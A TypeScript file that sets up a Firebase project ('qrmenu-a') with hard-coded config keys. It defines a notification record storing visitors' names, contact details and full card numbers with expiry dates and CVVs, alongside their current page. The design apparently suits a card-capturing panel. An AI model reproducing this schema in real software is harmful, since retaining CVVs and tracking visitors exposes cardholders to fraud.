import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyA29jisytpjRzNnN6eOuPs3bj5zKXrssLM",
  authDomain: "qrmenu-a.firebaseapp.com",
  projectId: "qrmenu-a",
  storageBucket: "qrmenu-a.firebasestorage.app",
  messagingSenderId: "37706816704",
  appId: "1:37706816704:web:c673ecd57b9de36d2e6125",
  measurementId: "G-K35X7L62P1"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

